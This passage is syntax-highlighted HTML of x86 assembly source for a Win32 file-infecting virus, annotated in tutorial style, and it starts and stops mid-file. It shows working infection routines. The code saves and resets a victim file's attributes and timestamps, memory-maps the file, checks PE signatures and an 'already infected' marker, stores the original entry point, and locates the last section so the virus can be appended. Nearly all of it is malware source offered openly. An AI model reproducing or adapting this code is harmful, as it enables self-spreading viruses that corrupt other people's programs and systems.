</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now after we have located the file that we want   ;;</span><span class="sc0">
</span><span class="sc1">;; to infect we must do something before we go and   ;;</span><span class="sc0">
</span><span class="sc1">;; play with it :), but for now remember that        ;;</span><span class="sc0">
</span><span class="sc1">;; -) ESI points to the filename                     ;;</span><span class="sc0">
</span><span class="sc1">;; -) ECX holds the file size                        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; Its time to start infecting the file this is easy ;;</span><span class="sc0">
</span><span class="sc1">;; under Win32 environment and we can achieve that   ;;</span><span class="sc0">
</span><span class="sc1">;; by manipulating the file itself but first by      ;;</span><span class="sc0">
</span><span class="sc1">;; mapping the file                                  ;;</span><span class="sc0">
</span><span class="sc1">;; By mapping you should understand this: a memory   ;;</span><span class="sc0">
</span><span class="sc1">;; area is allocated and the entire file is          ;;</span><span class="sc0">
</span><span class="sc1">;; mapped there, this means that you work directly   ;;</span><span class="sc0">
</span><span class="sc1">;; into memory  and everything that you do there is  ;;</span><span class="sc0">
</span><span class="sc1">;; reflected in the physical file also, all the      ;;</span><span class="sc0">
</span><span class="sc1">;; relative addresses inside the file start from the ;;</span><span class="sc0">
</span><span class="sc1">;; address of the map, here you must be very         ;;</span><span class="sc0">
</span><span class="sc1">;; attentive not to mix the file handle with the     ;;</span><span class="sc0">
</span><span class="sc1">;; map handle                                        ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                              </span><span class="sc1">; Save all registers</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newfilesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; Save file size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Reset the infection flag</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslen</span><span class="sc0">                       </span><span class="sc1">; ECX = victim filesize + virus</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                      </span><span class="sc1">; ECX = victim filesize + virus + 1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; Memory to map</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; When mapping a file we need an amount of memory   ;;</span><span class="sc0">
</span><span class="sc1">;; equal to the original file plus the virus length  ;;</span><span class="sc0">
</span><span class="sc1">;; which will be appended, plus some extra work      ;;</span><span class="sc0">
</span><span class="sc1">;; space, If you dont allocate enough memory for the ;;</span><span class="sc0">
</span><span class="sc1">;; map, when trying to write over the boundaries of  ;;</span><span class="sc0">
</span><span class="sc1">;; the map, the virus will generate an invalid fault ;;</span><span class="sc0">
</span><span class="sc1">;; page                                              ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets start first by saving the original       ;;</span><span class="sc0">
</span><span class="sc1">;; attributes                                        ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


    </span><span class="sc1">; ** can be gotten from win32_find_data</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileofs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; ESI = pointer to filename ***</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; Save it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the file attributes</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fileattributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Save them</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets set the nomral attributes to the file    ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Set them to normal</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets open the file                            ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; File template</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; File attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; Open existing file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Security option = default</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; File share for read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">                  </span><span class="sc1">; General write and read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; pointer to filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CreateFileA</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Call API</span><span class="sc0">
                                    </span><span class="sc1">; EAX = file handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Save file handle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">; error ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">InfectionError</span><span class="sc0">                      </span><span class="sc1">; cant open the file ?</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets save the following                       ;;</span><span class="sc0">
</span><span class="sc1">;; -) File creation time                             ;;</span><span class="sc0">
</span><span class="sc1">;; -) Last write time                                ;;</span><span class="sc0">
</span><span class="sc1">;; -) Last access time                               ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc1">; ** can be gotten from win32_find_data</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ftcreation</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileTime</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets get the file size and save it for later  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Save the filesize for later</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;add     dword ptr [ebp + offset newfilesize], eax               ; ** mov -&gt; add</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now lets go create the file mapping for the file  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Filename handle = NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Max size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Min size (no need)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Page read and write</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Security attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; File handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Call API</span><span class="sc0">
                                    </span><span class="sc1">; EAX = new map handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Save map handle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; Error ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">                       </span><span class="sc1">; Cant map file ?</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now if we were lucky and had the map of the file  ;;</span><span class="sc0">
</span><span class="sc1">;; next step is to map the view of that file         ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Bytes to map</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; File offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; File offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; File Map Write Mode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; File Map Handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Call API</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; Error ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseMap</span><span class="sc0">                        </span><span class="sc1">; Cant map view of file ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; ESI = base of map</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">; Save base of map</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The file is now opened and we can work on it      ;;</span><span class="sc0">
</span><span class="sc1">;; knowing that it is mapped at the ESI address, but ;;</span><span class="sc0">
</span><span class="sc1">;; we have to check at first whether its an EXE file ;;</span><span class="sc0">
</span><span class="sc1">;; and if its a PE file actually                     ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">; Is it an EXE file ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">                       </span><span class="sc1">; Error ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MS'</span><span class="sc0">              </span><span class="sc1">; Already infected ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">OkGo</span><span class="sc0">                            </span><span class="sc1">; Is it a PE EXE file ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; Mark it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">                       </span><span class="sc1">; Error ?</span><span class="sc0">

</span><span class="sc5">OkGo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; EBX = PE Header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">              </span><span class="sc1">; Is it a PE file ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">                       </span><span class="sc1">; Error ?</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; If the file is not EXE, is already infected or is ;;</span><span class="sc0">
</span><span class="sc1">;; not a PE file, we proceed to unmap the view of    ;;</span><span class="sc0">
</span><span class="sc1">;; file, otherwise we continue                       ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; ESI points to PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; Save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EAX = IP of file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The oldip value is the one we save and use for    ;;</span><span class="sc0">
</span><span class="sc1">;; when we want to return to the original host       ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
    </span><span class="sc1">;;ADDED</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EAX = file alignement</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filealign</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; When we append the virus to the PE file we        ;;</span><span class="sc0">
</span><span class="sc1">;; increase it's size, But the file alignment must   ;;</span><span class="sc0">
</span><span class="sc1">;; be preserved, the file alignment is a number      ;;</span><span class="sc0">
</span><span class="sc1">;; which divides the file size exactly               ;;</span><span class="sc0">
</span><span class="sc1">;; (filesize mod filealign = 0)                      ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now the real work starts as we have prepared      ;;</span><span class="sc0">
</span><span class="sc1">;; everything necessary for the virus to infect the  ;;</span><span class="sc0">
</span><span class="sc1">;; file, we start first by locating the last section ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Number of directories entries</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                          </span><span class="sc1">; * 8 (size)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; AX = number of sections</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Look for the last section ending</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                        </span><span class="sc1">; ECX = size of sections header</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; EAX = ECX * EAX</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; ESI = Pointer to the last section header</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; ** ebx = old peheader</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The formula used is like this                     ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;;  Address of the last sections header =            ;;</span><span class="sc0">
